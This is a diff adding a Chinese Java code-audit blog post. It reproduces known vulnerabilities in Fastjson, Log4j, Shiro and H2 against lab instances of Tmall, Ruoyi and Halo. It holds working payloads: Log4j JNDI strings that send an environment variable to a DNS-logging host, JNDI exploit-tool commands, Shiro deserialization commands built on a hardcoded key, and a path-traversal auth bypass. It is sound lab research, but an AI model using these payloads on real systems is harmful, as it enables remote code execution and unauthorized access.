@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="开发组件第三方组件安全1、找存在漏洞的第三方组件（PackageChecker插件） 2、找组件漏洞利用入口条件（根据网上已知漏洞复现条件） 3、找可控地方进行测试检测（根据网上已知漏洞利用条件） 常见第三方组件或框架漏洞列表： SolrShiroFastjsonJacksonLog4jSnakeYamlHessianH2database Xsteam、Druid、Struts2、Flink、Fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java代码审计-开发组件">
+<meta property="og:url" content="https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="开发组件第三方组件安全1、找存在漏洞的第三方组件（PackageChecker插件） 2、找组件漏洞利用入口条件（根据网上已知漏洞复现条件） 3、找可控地方进行测试检测（根据网上已知漏洞利用条件） 常见第三方组件或框架漏洞列表： SolrShiroFastjsonJacksonLog4jSnakeYamlHessianH2database Xsteam、Druid、Struts2、Flink、Fl">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719243983388-a7d78ab4-e7c9-4f17-9049-7fe0816dd5cc.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244030199-121e5e16-585a-4bd0-88ec-8961d9a99b4c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244070658-c66e2614-6490-4815-810b-dba10a0d2c8f.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244578596-1816367c-940a-4e2c-997c-1d4fa43f9241.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244596375-aa5ef740-ca3a-43ed-ba05-7a3c9945b450.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244647757-9a4585ed-6ad1-4a94-bcbd-10f47640f0f6.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244690165-bc5c146e-d880-455f-af22-4b51fddd76ad.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244816852-5ac54e4a-a51f-4089-85c3-d30d7fee096b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719245334211-3075037b-68a9-4802-b856-39a6c49003a3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246014790-96fc113c-cbd5-44d9-b91b-2af618bffb31.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246149359-e5c5cd62-aeab-4dbd-9ac0-e501c8c6b043.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246130966-45676b2d-6d06-47b8-8314-505d73b4518e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246296916-211f7537-a4db-490b-9297-dc174bee61e9.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246329431-ce34bda2-a214-4c0a-bf56-0ca891d600db.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246398286-ce03de84-40f5-45d2-a823-bfb10045a853.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246475774-6898fd4a-a39d-432c-b4e4-89297381c25a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246573120-91bb2105-35a1-4084-bb1a-90065c757703.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246599154-711174ff-3766-4002-84e1-e5cb323c44c3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246729108-7c66ba42-b67b-4877-bb7c-85f84bcbc40b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719296800167-4b477b8c-0de6-450a-8333-494f877f4c73.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719296923275-cf70b98e-8b6c-404c-97ff-1f2073a35059.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719313653902-877d5b02-3f68-40b3-a163-998a76cff2e0.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719314723527-305b1dca-339e-40c2-b3a6-6c7352b2eb49.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719314772637-5e1ddc13-434f-423f-bdc6-d229155a97cd.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719901361541-5d1239ac-11ef-4d8b-bcde-a4dde3a50ed8.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719902822307-4b31629b-d9ca-467c-b41b-ff5c9166acb8.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903123962-09d94779-2740-4ec9-8bbc-417e2910f3a1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903155176-abc5662c-5dbd-4bbf-af2d-b8ae90a3a8cf.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903732471-1dbdb7c7-ef8a-4462-8aca-4da6910acb4c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904062962-36b60d1b-2b75-4f76-aa35-40a96e4ced7d.png">
+<meta property="article:published_time" content="2024-11-04T14:51:29.000Z">
+<meta property="article:modified_time" content="2024-12-30T11:19:15.242Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719243983388-a7d78ab4-e7c9-4f17-9049-7fe0816dd5cc.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>java代码审计-开发组件</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(1)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&text=java代码审计-开发组件"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&is_video=false&description=java代码审计-开发组件"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=java代码审计-开发组件&body=Check out this article: https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&name=java代码审计-开发组件&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&t=java代码审计-开发组件"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">开发组件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-number">1.1.</span> <span class="toc-text">第三方组件安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tmall-Fastjson1-2-58"><span class="toc-number">1.1.1.</span> <span class="toc-text">Tmall-Fastjson1.2.58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tmall-Log4j2-10-0"><span class="toc-number">1.1.2.</span> <span class="toc-text">Tmall-Log4j2.10.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruoyi-Shiro1-4-2"><span class="toc-number">1.1.3.</span> <span class="toc-text">Ruoyi-Shiro1.4.2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">1、反序列化：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">2、权限绕过：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Halo-H2database-1-4-197"><span class="toc-number">1.1.4.</span> <span class="toc-text">Halo-H2database 1.4.197</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        java代码审计-开发组件
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-04T14:51:29.000Z" class="dt-published" itemprop="datePublished">2024-11-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="开发组件"><a href="#开发组件" class="headerlink" title="开发组件"></a>开发组件</h1><h2 id="第三方组件安全"><a href="#第三方组件安全" class="headerlink" title="第三方组件安全"></a>第三方组件安全</h2><p>1、找存在漏洞的第三方组件（PackageChecker插件）</p>
+<p>2、找组件漏洞利用入口条件（根据网上已知漏洞复现条件）</p>
+<p>3、找可控地方进行测试检测（根据网上已知漏洞利用条件）</p>
+<p>常见第三方组件或框架漏洞列表：</p>
+<p>SolrShiroFastjsonJacksonLog4jSnakeYamlHessianH2database</p>
+<p>Xsteam、Druid、Struts2、Flink、Flume、Dubbo、Redis、Logstash、ElasticSearch、Kafka、Ghidra、Minecraft、Hive、Datax、Streaming、DolphinScheduler、Storm、Spring等。</p>
+<p>运用插件</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719243983388-a7d78ab4-e7c9-4f17-9049-7fe0816dd5cc.png"></p>
+<p>勾选</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244030199-121e5e16-585a-4bd0-88ec-8961d9a99b4c.png"></p>
+<p>这样就会提示</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244070658-c66e2614-6490-4815-810b-dba10a0d2c8f.png"></p>
+<h3 id="Tmall-Fastjson1-2-58"><a href="#Tmall-Fastjson1-2-58" class="headerlink" title="Tmall-Fastjson1.2.58"></a>Tmall-Fastjson1.2.58</h3><p>触发点：JSON.parseObject() JSON.parse()</p>
+<p>全局搜索-&gt;JSON.parseObject()-&gt;propertyJson-&gt;admin&#x2F;product</p>
+<p>{“@type”:”java.net.Inet4Address”,”val”:”miyvosnszc.dgrh3.cn”}</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244578596-1816367c-940a-4e2c-997c-1d4fa43f9241.png"></p>
+<p>propertyJson可控</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244596375-aa5ef740-ca3a-43ed-ba05-7a3c9945b450.png"></p>
+<p>访问路由</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244647757-9a4585ed-6ad1-4a94-bcbd-10f47640f0f6.png"></p>
+<p>这边不能上传，再回到admin页面查找</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244690165-bc5c146e-d880-455f-af22-4b51fddd76ad.png"></p>
+<p>随便填填保存再抓包</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244816852-5ac54e4a-a51f-4089-85c3-d30d7fee096b.png"></p>
+<p>修改箭头指向部分{“@type”:”java.net.Inet4Address”,”val”:”miyvosnszc.dgrh3.cn”}</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719245334211-3075037b-68a9-4802-b856-39a6c49003a3.png"></p>
+<h3 id="Tmall-Log4j2-10-0"><a href="#Tmall-Log4j2-10-0" class="headerlink" title="Tmall-Log4j2.10.0"></a>Tmall-Log4j2.10.0</h3><p>触发点：logger.error logger.info</p>
+<p>全局搜索-&gt;logger.info-&gt;originalFileName-&gt;admin&#x2F;uploadAdminHeadImage</p>
+<p>${jndi:ldap:&#x2F;&#x2F;${env:OS}.mq6bqf.dnslog.cn}</p>
+<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C”calc”</p>
+<p>搜logger.info函数，里面还要有可控变量</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246014790-96fc113c-cbd5-44d9-b91b-2af618bffb31.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246149359-e5c5cd62-aeab-4dbd-9ac0-e501c8c6b043.png"></p>
+<p>自带方法获取文件名getOriginalFilename</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246130966-45676b2d-6d06-47b8-8314-505d73b4518e.png"></p>
+<p>直接访问路由不行</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246296916-211f7537-a4db-490b-9297-dc174bee61e9.png"></p>
+<p>根据方法名，猜测这里抓个包</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246329431-ce34bda2-a214-4c0a-bf56-0ca891d600db.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246398286-ce03de84-40f5-45d2-a823-bfb10045a853.png"></p>
+<p>控制这里</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246475774-6898fd4a-a39d-432c-b4e4-89297381c25a.png"></p>
+<p>${jndi:ldap:&#x2F;&#x2F;${env:OS}.vc8yl8.dnslog.cn}</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246573120-91bb2105-35a1-4084-bb1a-90065c757703.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246599154-711174ff-3766-4002-84e1-e5cb323c44c3.png"></p>
+<p>尝试成功直接上工具java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C”calc”</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246729108-7c66ba42-b67b-4877-bb7c-85f84bcbc40b.png"></p>
+<p>直接利用</p>
+<h3 id="Ruoyi-Shiro1-4-2"><a href="#Ruoyi-Shiro1-4-2" class="headerlink" title="Ruoyi-Shiro1.4.2"></a>Ruoyi-Shiro1.4.2</h3><p>4.2版本</p>
+<h4 id="1、反序列化："><a href="#1、反序列化：" class="headerlink" title="1、反序列化："></a>1、反序列化：</h4><p>setCipherKey-&gt;fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></p>
+<p>python shiro-exploit.py check -u <a target="_blank" rel="noopener" href="http://192.168.1.2/">http://192.168.1.2/</a></p>
+<p>python shiro-exploit.py echo -g CommonsCollectionsK1-u <a target="_blank" rel="noopener" href="http://192.168.1.2/-v">http://192.168.1.2/-v</a> 2 -k fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;-c whoami</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719296800167-4b477b8c-0de6-450a-8333-494f877f4c73.png"></p>
+<p>源码密钥位置setCipherKey   fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719296923275-cf70b98e-8b6c-404c-97ff-1f2073a35059.png"></p>
+<p>python3 shiro-exploit.py check -u <a target="_blank" rel="noopener" href="http://10.211.55.3:82/">http://10.211.55.3:82/</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719313653902-877d5b02-3f68-40b3-a163-998a76cff2e0.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719314723527-305b1dca-339e-40c2-b3a6-6c7352b2eb49.png"></p>
+<p>python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u <a target="_blank" rel="noopener" href="http://10.211.55.3:82/">http://10.211.55.3:82/</a> -v 2 -k fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D; -c whoami</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719314772637-5e1ddc13-434f-423f-bdc6-d229155a97cd.png"></p>
+<h4 id="2、权限绕过："><a href="#2、权限绕过：" class="headerlink" title="2、权限绕过："></a>2、权限绕过：</h4><p>-anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</p>
+<p>-authc为登录拦截器，需要登录认证才能访问的资源。</p>
+<p>例子：</p>
+<p>[urls]</p>
+<p>&#x2F;index.html &#x3D; anon 允许访问</p>
+<p>&#x2F;user&#x2F;** &#x3D; authc 需要验证</p>
+<p>shiro匹配规则</p>
+<p>?：匹配一个字符<br>*：匹配零个或多个字符串</p>
+<p>**：匹配路径中的零个或多个路径</p>
+<p>配置：com&#x2F;ruoyi&#x2F;framework&#x2F;config&#x2F;ShiroConfig.java</p>
+<p>绕过：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></p>
+<p>测试：&#x2F;ajax;&#x2F;..&#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;1.txt</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719901361541-5d1239ac-11ef-4d8b-bcde-a4dde3a50ed8.png"></p>
+<h3 id="Halo-H2database-1-4-197"><a href="#Halo-H2database-1-4-197" class="headerlink" title="Halo-H2database 1.4.197"></a>Halo-H2database 1.4.197</h3><p>H2database-&gt;application.yaml-&gt;web-allow-others: true</p>
+<p>javax.naming.InitialContext</p>
+<p>ldap:&#x2F;&#x2F;192.168.139.1:1389&#x2F;5eebf8</p>
+<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc”</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719902822307-4b31629b-d9ca-467c-b41b-ff5c9166acb8.png"></p>
+<p>数据库地址</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903123962-09d94779-2740-4ec9-8bbc-417e2910f3a1.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903155176-abc5662c-5dbd-4bbf-af2d-b8ae90a3a8cf.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903732471-1dbdb7c7-ef8a-4462-8aca-4da6910acb4c.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904062962-36b60d1b-2b75-4f76-aa35-40a96e4ced7d.png"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">开发组件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-number">1.1.</span> <span class="toc-text">第三方组件安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tmall-Fastjson1-2-58"><span class="toc-number">1.1.1.</span> <span class="toc-text">Tmall-Fastjson1.2.58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tmall-Log4j2-10-0"><span class="toc-number">1.1.2.</span> <span class="toc-text">Tmall-Log4j2.10.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruoyi-Shiro1-4-2"><span class="toc-number">1.1.3.</span> 